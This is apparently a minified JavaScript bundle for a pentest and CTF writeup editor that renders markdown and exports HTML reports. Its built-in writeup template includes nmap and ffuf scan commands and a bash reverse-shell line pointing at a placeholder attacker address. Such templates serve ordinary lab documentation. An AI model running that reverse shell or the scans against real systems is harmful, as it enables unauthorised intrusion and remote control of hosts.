import{b7 as ae,u as oe,r as y,j as e,a2 as ne,k as se,C as ie,d as le,aN as G,aO as de,ap as ce,D as pe,G as be,X as me,s as ue,I as fe,an as V,ay as xe,b8 as ge}from"./vendor-framework-CvQAcO8f.js";import{u as he,d as ye,e as ve,p as F,i as q,B as K}from"./index-B13aSfPa.js";import{PentestReportModal as we}from"./PentestReportModal-CuK4FP0v.js";import{g as ke,C as je,s as Ne}from"./obsidianManualUtils-M-zA6VD6.js";import"./vendor-utils-oQXWb4Lk.js";import"./vendor-ui-CXxOSkDg.js";import"./tracks-data-BVlFPHXm.js";import"./methodology-data-CbduTmc6.js";import"./cpts-vault-data-CUuU5G9N.js";function d(o){return o.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;").replace(/'/g,"&#039;")}function E(o){let a=d(o);return a=a.replace(/!\[(.*?)\]\((.*?)\)/g,(n,c,b)=>{const i=b.trim();return/^(https?:\/\/|data:image\/|\/|\.\/)/i.test(i)?`<img src="${i}" alt="${c}" class="writeup-img" loading="lazy" />`:`[Image: ${c}]`}),a=a.replace(/\[(.*?)\]\((.*?)\)/g,(n,c,b)=>{const i=b.trim();return/^(https?:\/\/|mailto:|#|\/|\.\/)/i.test(i)?`<a href="${i}" target="_blank" rel="noopener noreferrer" class="writeup-link">${c}</a>`:c}),a=a.replace(/`([^`]+)`/g,'<code class="inline-code">$1</code>'),a=a.replace(/\*\*\*([^*]+)\*\*\*/g,"<strong><em>$1</em></strong>"),a=a.replace(/\*\*([^*]+)\*\*/g,"<strong>$1</strong>"),a=a.replace(/\*([^*]+)\*/g,"<em>$1</em>"),a=a.replace(/_([^_]+)_/g,"<em>$1</em>"),a=a.replace(/~~([^~]+)~~/g,"<del>$1</del>"),a}function $e(o){const a=o.split(/\r?\n/),n=[];let c=!1;const b=[];let i=!1,g="";const C=[];let r=!1;const T=[];let j=null,I=!1;const M=[],l=()=>{I&&(n.push(`<blockquote>${M.map(h=>`<p>${E(h)}</p>`).join("")}</blockquote>`),M.length=0,I=!1)},m=()=>{j&&(n.push(`</${j}>`),j=null)},v=()=>{if(r&&T.length>0){const h=T[0],S=T.slice(1);let s='<div class="table-wrapper"><table><thead><tr>';h.forEach(k=>{s+=`<th>${E(k.trim())}</th>`}),s+="</tr></thead>",S.length>0&&(s+="<tbody>",S.forEach(k=>{s+="<tr>",k.forEach(D=>{s+=`<td>${E(D.trim())}</td>`}),s+="</tr>"}),s+="</tbody>"),s+="</table></div>",n.push(s),T.length=0,r=!1}};return a.forEach((h,S)=>{if(S===0&&h.trim()==="---"){c=!0;return}if(c){if(h.trim()==="---"){c=!1,n.push('<div class="frontmatter-box">'),n.push('<div class="frontmatter-title">YAML METADATA // OBSIDIAN COMPATIBLE</div>'),n.push('<dl class="frontmatter-grid">'),b.forEach(p=>{const x=p.indexOf(":");if(x>0){const B=p.slice(0,x).trim(),L=p.slice(x+1).trim();n.push(`<div class="frontmatter-item"><dt>${d(B)}</dt><dd>${d(L)}</dd></div>`)}}),n.push("</dl></div>");return}b.push(h);return}if(h.trim().startsWith("```")){if(l(),m(),v(),!i)i=!0,g=h.trim().replace(/^```/,"").trim(),C.length=0;else{i=!1;const p=d(C.join(`
`)),x=g||"text";n.push(`
          <div class="codeblock-container">
            <div class="codeblock-header">
              <span class="codeblock-lang">${d(x)}</span>
              <button class="codeblock-copy-btn" onclick="copyCode(this)">Copy</button>
            </div>
            <pre><code class="language-${d(x)}">${p}</code></pre>
          </div>
        `)}return}if(i){C.push(h);return}const s=h.trim();if(s.startsWith("|")&&s.endsWith("|")){if(l(),m(),/^\|[-:| ]+\|$/.test(s))return;const p=s.slice(1,-1).split("|").map(x=>x.trim());r=!0,T.push(p);return}else r&&v();if(s.startsWith(">")){m(),v(),I=!0,M.push(s.replace(/^>\s?/,""));return}else I&&l();if(s==="---"||s==="***"||s==="___"){l(),m(),v(),n.push("<hr />");return}const k=s.match(/^(#{1,6})\s+(.*)$/);if(k){l(),m(),v();const p=k[1].length,x=k[2],B=x.toLowerCase().replace(/[^a-z0-9]+/g,"-").replace(/(^-|-$)/g,"");n.push(`<h${p} id="${B}">${E(x)}</h${p}>`);return}const D=s.match(/^[-*]\s+(.*)$/);if(D){l(),v(),j!=="ul"&&(m(),j="ul",n.push("<ul>"));let p=D[1];p.startsWith("[ ] ")?n.push(`<li class="task-list-item"><input type="checkbox" disabled /> ${E(p.slice(4))}</li>`):p.startsWith("[x] ")||p.startsWith("[X] ")?n.push(`<li class="task-list-item"><input type="checkbox" checked disabled /> ${E(p.slice(4))}</li>`):n.push(`<li>${E(p)}</li>`);return}const z=s.match(/^\d+\.\s+(.*)$/);if(z){l(),v(),j!=="ol"&&(m(),j="ol",n.push("<ol>")),n.push(`<li>${E(z[1])}</li>`);return}if(s===""){l(),m(),v();return}l(),m(),v(),n.push(`<p>${E(h)}</p>`)}),l(),m(),v(),n.join(`
`)}function Ce(){return`
    :root {
      --bg: #07090e;
      --card-bg: #0c1017;
      --border: #1e2638;
      --text: #c5d1de;
      --text-muted: #738496;
      --heading: #f0f6fc;
      --accent-cyan: #00f0ff;
      --accent-emerald: #00ff66;
      --accent-purple: #a855f7;
      --accent-red: #ff3366;
      --code-bg: #05070a;
      --header-bg: rgba(12, 16, 23, 0.95);
      --font-mono: ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, "Liberation Mono", monospace;
      --font-sans: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    }

    body.light-theme {
      --bg: #f8fafc;
      --card-bg: #ffffff;
      --border: #cbd5e1;
      --text: #1e293b;
      --text-muted: #64748b;
      --heading: #0f172a;
      --accent-cyan: #0284c7;
      --accent-emerald: #16a34a;
      --accent-purple: #7e22ce;
      --accent-red: #dc2626;
      --code-bg: #f1f5f9;
      --header-bg: rgba(255, 255, 255, 0.95);
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      background-color: var(--bg);
      color: var(--text);
      font-family: var(--font-sans);
      font-size: 15px;
      line-height: 1.65;
      padding: 0;
      margin: 0;
      min-height: 100vh;
      -webkit-font-smoothing: antialiased;
      transition: background-color 0.2s ease, color 0.2s ease;
    }

    /* Floating Tactical Action Bar */
    .action-bar {
      position: sticky;
      top: 0;
      z-index: 1000;
      background: var(--header-bg);
      backdrop-filter: blur(12px);
      -webkit-backdrop-filter: blur(12px);
      border-bottom: 1px solid var(--border);
      padding: 10px 24px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 12px;
      font-family: var(--font-mono);
    }

    .action-bar-brand {
      display: flex;
      align-items: center;
      gap: 8px;
      font-weight: 800;
      font-size: 13px;
      letter-spacing: 0.05em;
      color: var(--heading);
    }

    .brand-accent {
      color: var(--accent-cyan);
    }

    .action-bar-controls {
      display: flex;
      align-items: center;
      gap: 8px;
    }

    .btn {
      appearance: none;
      background: var(--card-bg);
      border: 1px solid var(--border);
      color: var(--text);
      font-family: var(--font-mono);
      font-size: 12px;
      font-weight: 600;
      padding: 6px 14px;
      border-radius: 6px;
      cursor: pointer;
      display: inline-flex;
      align-items: center;
      gap: 6px;
      transition: all 0.15s ease;
    }

    .btn:hover {
      border-color: var(--accent-cyan);
      color: var(--heading);
    }

    .btn-primary {
      background: var(--accent-cyan);
      border-color: var(--accent-cyan);
      color: #000000;
      font-weight: 700;
    }

    .btn-primary:hover {
      opacity: 0.9;
      color: #000000;
    }

    /* Container & Layout */
    .container {
      max-width: 900px;
      margin: 0 auto;
      padding: 32px 24px 80px;
    }

    /* Target Metadata Card */
    .target-card {
      background: var(--card-bg);
      border: 1px solid var(--border);
      border-radius: 12px;
      padding: 24px;
      margin-bottom: 32px;
      position: relative;
      overflow: hidden;
    }

    .target-card::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      height: 3px;
      background: linear-gradient(90deg, var(--accent-cyan), var(--accent-emerald));
    }

    .target-header {
      display: flex;
      flex-wrap: wrap;
      align-items: center;
      justify-content: space-between;
      gap: 16px;
      margin-bottom: 16px;
    }

    .target-title {
      font-size: 26px;
      font-weight: 800;
      color: var(--heading);
      letter-spacing: -0.02em;
    }

    .badge-group {
      display: flex;
      flex-wrap: wrap;
      gap: 6px;
    }

    .badge {
      display: inline-flex;
      align-items: center;
      padding: 4px 10px;
      border-radius: 6px;
      font-size: 11px;
      font-weight: 700;
      font-family: var(--font-mono);
      text-transform: uppercase;
      letter-spacing: 0.04em;
    }

    .badge-cyan {
      background: rgba(0, 240, 255, 0.12);
      color: var(--accent-cyan);
      border: 1px solid rgba(0, 240, 255, 0.3);
    }

    .badge-emerald {
      background: rgba(0, 255, 102, 0.12);
      color: var(--accent-emerald);
      border: 1px solid rgba(0, 255, 102, 0.3);
    }

    .badge-purple {
      background: rgba(168, 85, 247, 0.12);
      color: var(--accent-purple);
      border: 1px solid rgba(168, 85, 247, 0.3);
    }

    .target-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
      gap: 12px;
      margin-top: 16px;
      font-family: var(--font-mono);
      font-size: 12px;
    }

    .target-field {
      background: var(--code-bg);
      border: 1px solid var(--border);
      border-radius: 6px;
      padding: 8px 12px;
    }

    .target-field-label {
      font-size: 10px;
      color: var(--text-muted);
      text-transform: uppercase;
      font-weight: 700;
      margin-bottom: 2px;
    }

    .target-field-val {
      color: var(--heading);
      font-weight: 600;
      word-break: break-all;
    }

    /* Content Typography */
    .writeup-body h1, .writeup-body h2, .writeup-body h3, .writeup-body h4 {
      color: var(--heading);
      font-weight: 700;
      margin-top: 32px;
      margin-bottom: 12px;
      line-height: 1.3;
      page-break-after: avoid;
    }

    .writeup-body h1 {
      font-size: 24px;
      border-bottom: 1px solid var(--border);
      padding-bottom: 8px;
    }

    .writeup-body h2 {
      font-size: 19px;
      color: var(--accent-cyan);
    }

    .writeup-body h3 {
      font-size: 16px;
    }

    .writeup-body p {
      margin-bottom: 16px;
    }

    .writeup-body hr {
      border: none;
      border-top: 1px solid var(--border);
      margin: 28px 0;
    }

    .writeup-body a.writeup-link {
      color: var(--accent-cyan);
      text-decoration: underline;
      text-underline-offset: 3px;
    }

    .writeup-body img.writeup-img {
      max-width: 100%;
      height: auto;
      border-radius: 8px;
      border: 1px solid var(--border);
      margin: 16px 0;
      display: block;
    }

    /* Inline Code */
    .inline-code {
      font-family: var(--font-mono);
      background: var(--code-bg);
      color: var(--accent-emerald);
      border: 1px solid var(--border);
      padding: 2px 6px;
      border-radius: 4px;
      font-size: 0.9em;
    }

    /* Code Blocks */
    .codeblock-container {
      margin: 18px 0;
      border-radius: 8px;
      background: var(--code-bg);
      border: 1px solid var(--border);
      overflow: hidden;
      page-break-inside: avoid;
    }

    .codeblock-header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 6px 12px;
      background: rgba(0, 0, 0, 0.2);
      border-bottom: 1px solid var(--border);
      font-family: var(--font-mono);
      font-size: 11px;
    }

    .codeblock-lang {
      color: var(--text-muted);
      text-transform: uppercase;
      font-weight: 700;
    }

    .codeblock-copy-btn {
      background: transparent;
      border: 1px solid var(--border);
      border-radius: 4px;
      color: var(--text-muted);
      cursor: pointer;
      font-size: 10px;
      padding: 2px 8px;
      font-family: var(--font-mono);
      transition: all 0.15s ease;
    }

    .codeblock-copy-btn:hover {
      color: var(--heading);
      border-color: var(--accent-cyan);
    }

    .codeblock-container pre {
      padding: 14px;
      overflow-x: auto;
      margin: 0;
      font-family: var(--font-mono);
      font-size: 13px;
      line-height: 1.55;
      color: var(--text);
    }

    /* Blockquotes */
    blockquote {
      border-left: 3px solid var(--accent-purple);
      background: rgba(168, 85, 247, 0.05);
      padding: 12px 18px;
      margin: 18px 0;
      border-radius: 0 6px 6px 0;
    }

    blockquote p {
      margin-bottom: 6px;
    }

    blockquote p:last-child {
      margin-bottom: 0;
    }

    /* Lists */
    ul, ol {
      margin: 16px 0;
      padding-left: 24px;
    }

    li {
      margin-bottom: 6px;
    }

    li.task-list-item {
      list-style-type: none;
      margin-left: -20px;
      display: flex;
      align-items: baseline;
      gap: 8px;
    }

    /* Tables */
    .table-wrapper {
      overflow-x: auto;
      margin: 20px 0;
    }

    table {
      width: 100%;
      border-collapse: collapse;
      font-size: 13px;
      page-break-inside: avoid;
    }

    th, td {
      border: 1px solid var(--border);
      padding: 10px 14px;
      text-align: left;
    }

    th {
      background: var(--code-bg);
      font-family: var(--font-mono);
      color: var(--heading);
      font-weight: 700;
    }

    /* Frontmatter Box */
    .frontmatter-box {
      background: var(--code-bg);
      border: 1px solid rgba(0, 240, 255, 0.25);
      border-radius: 8px;
      padding: 14px 18px;
      margin-bottom: 24px;
      font-family: var(--font-mono);
    }

    .frontmatter-title {
      font-size: 10px;
      font-weight: 800;
      color: var(--accent-cyan);
      letter-spacing: 0.08em;
      margin-bottom: 8px;
    }

    .frontmatter-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
      gap: 6px 16px;
      font-size: 11px;
    }

    .frontmatter-item {
      display: flex;
      gap: 8px;
    }

    .frontmatter-item dt {
      color: var(--text-muted);
      font-weight: 700;
    }

    .frontmatter-item dd {
      color: var(--heading);
    }

    /* Footer */
    .writeup-footer {
      margin-top: 60px;
      padding-top: 24px;
      border-top: 1px solid var(--border);
      display: flex;
      justify-content: space-between;
      align-items: center;
      font-size: 11px;
      font-family: var(--font-mono);
      color: var(--text-muted);
    }

    /* Media Print Optimization (Clean 1-Click Save to PDF) */
    @media print {
      body {
        background-color: #ffffff !important;
        color: #111827 !important;
        font-size: 11pt !important;
        line-height: 1.5 !important;
      }

      .action-bar {
        display: none !important;
      }

      .container {
        max-width: 100% !important;
        padding: 0 !important;
        margin: 0 !important;
      }

      .target-card {
        border: 1px solid #d1d5db !important;
        background: #f9fafb !important;
        page-break-inside: avoid !important;
      }

      .target-card::before {
        display: none !important;
      }

      .target-field {
        background: #ffffff !important;
        border: 1px solid #e5e7eb !important;
      }

      .target-field-val {
        color: #111827 !important;
      }

      .writeup-body h1, .writeup-body h2, .writeup-body h3 {
        color: #111827 !important;
        page-break-after: avoid !important;
      }

      .writeup-body h1 {
        border-bottom: 1px solid #e5e7eb !important;
      }

      .codeblock-container {
        border: 1px solid #d1d5db !important;
        background: #f9fafb !important;
        page-break-inside: avoid !important;
      }

      .codeblock-header {
        background: #e5e7eb !important;
      }

      .codeblock-copy-btn {
        display: none !important;
      }

      .codeblock-container pre {
        color: #1f2937 !important;
      }

      .inline-code {
        background: #f3f4f6 !important;
        color: #111827 !important;
        border: 1px solid #d1d5db !important;
      }

      table {
        page-break-inside: avoid !important;
      }

      th, td {
        border: 1px solid #d1d5db !important;
      }

      th {
        background: #f3f4f6 !important;
        color: #111827 !important;
      }

      .frontmatter-box {
        border: 1px solid #d1d5db !important;
        background: #f9fafb !important;
      }

      .frontmatter-item dd {
        color: #111827 !important;
      }
    }
  `}function Te(o){let a="";try{typeof btoa<"u"&&(a=btoa(unescape(encodeURIComponent(o))))}catch{a=""}return`
    const RAW_MARKDOWN = "${a}";

    function copyRawMarkdown(btn) {
      try {
        const decoded = decodeURIComponent(escape(atob(RAW_MARKDOWN)));
        navigator.clipboard.writeText(decoded).then(() => {
          const originalText = btn.innerText;
          btn.innerText = "✓ Copied!";
          setTimeout(() => { btn.innerText = originalText; }, 2000);
        });
      } catch (err) {
        console.error("Clipboard copy failed:", err);
      }
    }

    function toggleTheme() {
      const isLight = document.body.classList.toggle('light-theme');
      const themeBtn = document.getElementById('themeToggleBtn');
      if (themeBtn) {
        themeBtn.innerText = isLight ? "🌙 Dark Mode" : "☀️ Light Mode";
      }
    }

    function copyCode(btn) {
      const pre = btn.closest('.codeblock-container').querySelector('pre code');
      if (!pre) return;
      navigator.clipboard.writeText(pre.innerText).then(() => {
        const orig = btn.innerText;
        btn.innerText = "Copied!";
        setTimeout(() => { btn.innerText = orig; }, 1800);
      });
    }
  `}function Ee(o,a,n={}){const c=n.brandName||"ZEROBOX",b=n.author||"ZeroBox Operator",i=new Date().toISOString().slice(0,10),g=$e(a),C=Ce(),r=Te(a),T=o.openPorts&&o.openPorts.length>0?o.openPorts.join(", "):"None recorded";return`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>${d(o.name)} — Penetration Testing Writeup</title>
  <style>
${C}
  </style>
</head>
<body>
  <!-- Interactive Action Bar -->
  <header class="action-bar">
    <div class="action-bar-brand">
      <span>⚡</span>
      <span>${d(c)} <span class="brand-accent">// TACTICAL REPORT</span></span>
    </div>
    <div class="action-bar-controls">
      <button class="btn" id="themeToggleBtn" onclick="toggleTheme()">☀️ Light Mode</button>
      <button class="btn" onclick="copyRawMarkdown(this)">📋 Copy Raw .md</button>
      <button class="btn btn-primary" onclick="window.print()">🖨️ Print / Save PDF</button>
    </div>
  </header>

  <main class="container">
    <!-- Target Overview HUD -->
    <section class="target-card">
      <div class="target-header">
        <div>
          <div class="target-title">${d(o.name)}</div>
          <div style="font-family: var(--font-mono); font-size: 12px; color: var(--text-muted); margin-top: 4px;">
            Target Host Assessment &amp; Exploit Walkthrough
          </div>
        </div>
        <div class="badge-group">
          <span class="badge badge-cyan">${d(o.platform)}</span>
          <span class="badge badge-emerald">${d(o.os)}</span>
          <span class="badge badge-purple">${d(o.difficulty)}</span>
        </div>
      </div>

      <div class="target-grid">
        <div class="target-field">
          <div class="target-field-label">Target IP</div>
          <div class="target-field-val">${d(o.ip||"N/A")}</div>
        </div>
        <div class="target-field">
          <div class="target-field-label">Status</div>
          <div class="target-field-val">${d(o.status||"todo")}</div>
        </div>
        <div class="target-field">
          <div class="target-field-label">Time Spent</div>
          <div class="target-field-val">${Math.round((o.timeSpentSeconds||0)/60)} mins</div>
        </div>
        <div class="target-field">
          <div class="target-field-label">Open Ports</div>
          <div class="target-field-val">${d(T)}</div>
        </div>
        <div class="target-field">
          <div class="target-field-label">User Flag</div>
          <div class="target-field-val">${d(o.userFlag||"FLAG{...}")}</div>
        </div>
        <div class="target-field">
          <div class="target-field-label">Root Flag</div>
          <div class="target-field-val">${d(o.rootFlag||"FLAG{...}")}</div>
        </div>
      </div>
    </section>

    <!-- Writeup Markdown Body -->
    <article class="writeup-body">
${g}
    </article>

    <!-- Footer -->
    <footer class="writeup-footer">
      <div>OPERATOR: ${d(b)} // CLASSIFICATION: CONFIDENTIAL</div>
      <div>EXPORTED: ${d(i)} via ${d(c)}</div>
    </footer>
  </main>

  <script>
${r}
  <\/script>
</body>
</html>`}function Se(o,a,n={}){const c=Ee(o,a,n),b=new Blob([c],{type:"text/html;charset=utf-8"}),i=URL.createObjectURL(b),g=document.createElement("a");g.href=i;const C=(o.name||"target").toLowerCase().replace(/[^a-z0-9]/g,"-");g.download=`${C}-writeup.html`,document.body.appendChild(g),g.click(),document.body.removeChild(g),URL.revokeObjectURL(i)}const Le=()=>{const{id:o}=ae(),{machines:a,writeupMachineId:n,setWriteupMachineId:c,updateMachine:b,soundEnabled:i,globalVars:g,appBrand:C}=he(oe(t=>({machines:t.machines,writeupMachineId:t.writeupMachineId,setWriteupMachineId:t.setWriteupMachineId,updateMachine:t.updateMachine,soundEnabled:t.soundEnabled,globalVars:t.globalVars,appBrand:t.appBrand})));y.useEffect(()=>{o&&a.some(t=>t.id===o)&&c(o)},[o,a,c]);const r=a.find(t=>t.id===n)||a[0],[T,j]=y.useState(!1),[I,M]=y.useState(!1),[l,m]=y.useState(""),[v,h]=y.useState(!1),[S,s]=y.useState(""),[k,D]=y.useState(""),[z,p]=y.useState(null);y.useEffect(()=>{const t=setTimeout(()=>{D(S)},150);return()=>clearTimeout(t)},[S]);const x=y.useMemo(()=>k.trim()?Ne(k,"ALL").slice(0,20):r?ke(r,20):je.slice(0,20),[k,r]),B=t=>{if(!r)return;const u={...g,targetIp:r.ip||g.targetIp},w=t.commands&&t.commands.length>0?`
\`\`\`bash
# ${t.title}
${t.commands.map(A=>q(A,u)).join(`
`)}
\`\`\`
`:"",W=`

---

### 📚 Field Manual: ${t.title}
> **Category:** ${t.category} | **Difficulty:** ${t.difficulty}
> ${t.summary||t.subCategory}
${w}`,R=l+W;m(R),b(r.id,{writeupMarkdown:R}),i&&F("root")},L=t=>{const u=new Date().toISOString().slice(0,10),w=t.tags.length>0?t.tags.join(", "):"ctf, pentest, writeup";return`---
title: "${t.platform||"CTF"} Writeup - ${t.name}"
target_ip: "${t.ip}"
platform: "${t.platform}"
os: "${t.os}"
difficulty: "${t.difficulty}"
status: "${t.status}"
user_flag: "${t.userFlag||"FLAG{...}"}"
root_flag: "${t.rootFlag||"FLAG{...}"}"
time_spent: "${Math.round(t.timeSpentSeconds/60)} minutes"
tags: [${w}]
date: "${u}"
author: "ZeroBox Operator"
---

# ${t.name} — Writeup & Penetration Testing Report
**Target IP:** \`${t.ip}\` | **OS:** ${t.os} | **Platform:** ${t.platform} | **Difficulty:** ${t.difficulty}

---

## 1. Executive Summary & Difficulty Breakdown
- **Initial Foothold Vector:** [Brief summary of initial vulnerability, e.g. SQL Injection / LFI / Deserialization]
- **Privilege Escalation Vector:** [Brief summary of root escalation, e.g. SUID binary / Sudo misconfiguration / ADCS]
- **Perceived Rating:** ${t.difficulty} (Official) vs ${t.perceivedDifficulty||t.difficulty} (Perceived)

---

## 2. Reconnaissance & Nmap Scan Results
### TCP All-Ports Scan
\`\`\`bash
# Fast SYN and Service Version Detection
nmap -sC -sV -Pn --min-rate 2000 -oN nmap_quick.txt ${t.ip}
\`\`\`

### Discovered Services:
- **Port 22/tcp:** Open (OpenSSH 8.4p1)
- **Port 80/tcp:** Open (Apache httpd 2.4.41)
- **Port 445/tcp:** Filtered (SMB)

### Web Directory & Endpoint Fuzzing
\`\`\`bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://${t.ip}/FUZZ -ac
\`\`\`

---

## 3. Vulnerability Analysis & Foothold Exploitation
### Discovery:
[Detail the attack vector found during enumeration]

### Exploitation Proof-of-Concept:
\`\`\`bash
# Reverse Shell or Exploit Execution
bash -i >& /dev/tcp/10.10.14.X/4444 0>&1
\`\`\`

### User Flag Loot:
\`\`\`bash
cat /home/*/user.txt
# Flag: ${t.userFlag||"FLAG{...}"}
\`\`\`

---

## 4. Privilege Escalation & Proof of Concept
### Internal Enumeration:
- Ran LinPEAS / WinPEAS automated audit.
- Identified misconfigured SUID / Sudo permissions:
\`\`\`bash
sudo -l
\`\`\`

### Root Escalation:
[Explain escalation path step by step]

### Root / System Flag:
\`\`\`bash
cat /root/root.txt
# Flag: ${t.rootFlag||"FLAG{...}"}
\`\`\`

---

## 5. Post-Exploitation Loot & Lessons Learned
- **Key Takeaway 1:** Always inspect source comments for credential leaks.
- **Key Takeaway 2:** Validate wildcard expansions in scheduled crontabs.
- **Mitigation:** Patch vulnerable services, restrict sudoers configuration, and apply least privilege principles.
`},O=y.useRef(null),P=y.useRef(null),U=y.useRef(""),H=()=>{O.current&&(clearTimeout(O.current),O.current=null),P.current&&U.current!==""&&(b(P.current,{writeupMarkdown:U.current}),P.current=null)};y.useEffect(()=>()=>{H()},[]),y.useEffect(()=>{if(H(),r)if(r.writeupMarkdown)m(r.writeupMarkdown);else{const t=L(r);m(t),b(r.id,{writeupMarkdown:t})}},[r==null?void 0:r.id]);const Y=t=>{const u=t.target.value;m(u),r&&(P.current=r.id,U.current=u,O.current&&clearTimeout(O.current),O.current=setTimeout(()=>{r&&(b(r.id,{writeupMarkdown:u}),P.current=null)},400))},X=()=>{if(r&&confirm(`Reset writeup for ${r.name} to standard template?`)){const t=L(r);m(t),b(r.id,{writeupMarkdown:t}),i&&F("root")}},Z=()=>{navigator.clipboard.writeText(l),j(!0),i&&F("copy"),setTimeout(()=>j(!1),2e3)},Q=()=>{if(!r)return;const t=new Blob([l],{type:"text/markdown;charset=utf-8"}),u=URL.createObjectURL(t),w=document.createElement("a");w.href=u,w.download=`${r.name.toLowerCase().replace(/[^a-z0-9]/g,"-")}-writeup.md`,document.body.appendChild(w),w.click(),document.body.removeChild(w),URL.revokeObjectURL(u),i&&F("root")},J=()=>{if(!r)return;const t=K.find(u=>u.id===C)||K[0];Se(r,l,{brandName:`${t.namePrefix}${t.nameSuffix}`}),i&&F("export")},ee=t=>{const u=t.split(`
`);let w=!1,W=[],R=!1,A="",_=[];const N=[];return u.forEach((f,$)=>{if($===0&&f.trim()==="---"){w=!0;return}if(w){if(f.trim()==="---"){w=!1,N.push(e.jsxs("div",{className:"mb-4 p-3 rounded-lg bg-cyber-bg border border-cyber-cyan/30 text-[11px] font-mono text-cyber-cyan/90 space-y-0.5",children:[e.jsxs("div",{className:"text-[10px] uppercase font-bold text-cyber-muted mb-1 flex items-center gap-1",children:[e.jsx(ge,{className:"w-3 h-3 text-cyber-cyan"})," OBSIDIAN / GITBOOK YAML FRONTMATTER"]}),W.map((te,re)=>e.jsx("div",{children:te},re))]},`fm-${$}`));return}W.push(f);return}if(f.startsWith("```")){R?(R=!1,N.push(e.jsxs("div",{className:"my-3 rounded-lg overflow-hidden border border-cyber-border bg-cyber-code",children:[A&&e.jsxs("div",{className:"bg-cyber-bg/80 px-3 py-1 text-[10px] text-cyber-muted font-mono uppercase border-b border-cyber-border flex items-center justify-between",children:[e.jsx("span",{children:A}),e.jsx(V,{className:"w-3 h-3"})]}),e.jsx("pre",{className:"p-3 text-xs text-cyber-emerald font-mono overflow-x-auto whitespace-pre-wrap",children:_.join(`
`)})]},`cb-${$}`))):(R=!0,A=f.replace("```","").trim(),_=[]);return}if(R){_.push(f);return}f.startsWith("# ")?N.push(e.jsx("h1",{className:"text-xl font-bold text-slate-900 dark:text-white mt-4 mb-2 pb-1 border-b border-cyber-border",children:f.replace("# ","")},$)):f.startsWith("## ")?N.push(e.jsx("h2",{className:"text-base font-bold text-cyber-cyan mt-4 mb-1.5 flex items-center gap-2",children:f.replace("## ","")},$)):f.startsWith("### ")?N.push(e.jsx("h3",{className:"text-sm font-semibold text-cyber-text mt-3 mb-1",children:f.replace("### ","")},$)):f.startsWith("---")?N.push(e.jsx("hr",{className:"my-3 border-cyber-border"},$)):f.startsWith("- ")?N.push(e.jsx("li",{className:"ml-4 text-xs text-cyber-text list-disc my-0.5",children:f.replace("- ","")},$)):f.trim()===""?N.push(e.jsx("div",{className:"h-2"},$)):N.push(e.jsx("p",{className:"text-xs text-cyber-text leading-relaxed font-sans",children:f},$))}),N};return e.jsxs("div",{className:"space-y-4 w-full font-mono",children:[e.jsxs("div",{className:"p-4 rounded-xl border border-cyber-border bg-cyber-card/90 shadow-md flex flex-wrap items-center justify-between gap-4",children:[e.jsxs("div",{className:"flex items-center gap-3",children:[e.jsx("div",{className:"w-10 h-10 rounded-lg bg-cyber-bg border border-cyber-cyan/40 flex items-center justify-center",children:e.jsx(ne,{className:"w-5 h-5 text-cyber-cyan"})}),e.jsxs("div",{children:[e.jsxs("h1",{className:"text-base font-bold text-slate-900 dark:text-white flex items-center gap-2",children:["EMBEDDED WRITEUP STUDIO",e.jsx("span",{className:"text-[10px] font-semibold px-2 py-0.5 rounded bg-cyber-cyan/10 text-cyber-cyan border border-cyber-cyan/30",children:"OBSIDIAN & GITBOOK READY"})]}),e.jsx("p",{className:"text-xs text-cyber-muted mt-0.5",children:"Dual-pane live editor with automated pentest template generation, frontmatter, and single-click .md export."})]})]}),e.jsxs("div",{className:"flex flex-wrap items-center gap-2.5",children:[e.jsxs("div",{className:"flex items-center gap-1.5 bg-cyber-bg px-2.5 py-1 rounded-lg border border-cyber-border",children:[e.jsx("span",{className:"text-[10px] uppercase font-bold text-cyber-muted",children:"Target Box:"}),e.jsx(ye,{value:(r==null?void 0:r.id)||"",onChange:c,options:a.map(t=>({value:t.id,label:`${t.name} (${t.platform})`,icon:e.jsx(ve,{platform:t.platform,className:"w-3.5 h-3.5"}),description:`${t.ip} · ${t.difficulty}`})),searchable:!0,searchPlaceholder:"Search box by name, IP...",variant:"transparent",size:"xs",triggerClassName:"py-0 px-1 border-none bg-transparent hover:bg-transparent max-w-[210px]",soundEnabled:i})]}),e.jsxs("button",{onClick:X,className:"flex items-center gap-1 px-2.5 py-1.5 rounded-lg bg-cyber-bg border border-cyber-border text-cyber-muted hover:text-slate-900 dark:hover:text-white text-xs transition-colors",title:"Reset to fresh pentest template",children:[e.jsx(se,{className:"w-3.5 h-3.5"}),e.jsx("span",{className:"hidden sm:inline",children:"Reset Template"})]}),e.jsx("button",{onClick:Z,className:"flex items-center gap-1 px-3 py-1.5 rounded-lg bg-cyber-card border border-cyber-border hover:border-cyber-cyan text-slate-900 dark:text-white text-xs font-semibold transition-all",children:T?e.jsxs(e.Fragment,{children:[e.jsx(ie,{className:"w-3.5 h-3.5 text-cyber-emerald"}),e.jsx("span",{className:"text-cyber-emerald",children:"Copied!"})]}):e.jsxs(e.Fragment,{children:[e.jsx(le,{className:"w-3.5 h-3.5"}),e.jsx("span",{children:"Copy Raw"})]})}),e.jsxs("button",{onClick:()=>h(t=>!t),className:`flex items-center gap-1.5 px-3 py-1.5 rounded-lg border text-xs font-bold transition-all shadow-sm ${v?"bg-purple-500 text-black border-purple-400 shadow-purple-500/30":"bg-purple-950/30 border-purple-500/40 text-purple-300 hover:bg-purple-900/40 hover:text-white"}`,title:"Toggle Field Manual Quick Reference Drawer",children:[e.jsx(G,{className:"w-3.5 h-3.5"}),e.jsxs("span",{children:["Field Manual (",x.length,")"]})]}),e.jsxs("button",{onClick:()=>M(!0),className:"flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-cyber-card border border-cyber-cyan/40 hover:border-cyber-cyan text-cyber-cyan hover:bg-cyber-cyan/10 text-xs font-bold 